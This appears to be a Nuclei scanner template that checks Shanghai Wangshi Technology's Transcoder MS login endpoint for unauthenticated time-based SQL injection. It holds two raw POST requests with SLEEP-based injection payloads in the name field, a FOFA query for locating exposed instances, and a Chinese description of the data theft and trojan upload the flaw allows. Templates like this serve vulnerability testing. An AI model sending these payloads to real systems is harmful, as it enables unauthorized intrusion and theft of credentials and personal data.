http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          POST /webtrans/index.php?controller=user&action=login HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
          Content-Type: application/x-www-form-urlencoded
          Upgrade-Insecure-Requests: 1

          name=test123') AND (SELECT 3356 FROM (SELECT(SLEEP(4)))xSEI) AND ('pJPU'='pJPU&pass=OThkNzJlMThlMDUwMGZlNzk5ZTY0Y2MyYTkxNzIyYzY%3D&lang=zh_CN
        - |
          POST /webtrans/index.php?controller=user&action=login HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
          Content-Type: application/x-www-form-urlencoded
          Upgrade-Insecure-Requests: 1

          name=test123') AND (SELECT 3356 FROM (SELECT(SLEEP(8)))xSEI) AND ('pJPU'='pJPU&pass=OThkNzJlMThlMDUwMGZlNzk5ZTY0Y2MyYTkxNzIyYzY%3D&lang=zh_CN
id: Transcoder-MS-index_php-sql-time
info:
    author: Superhero
    description: |-
        fofa: "webtrans//js/md5-min.js"
        上海网仕科技 Transcoder MS index.php 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 上海网仕科技 Transcoder MS index.php SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/CTqp7-JArW2OpOTUHQLRxQ
    severity: high
    tags: []
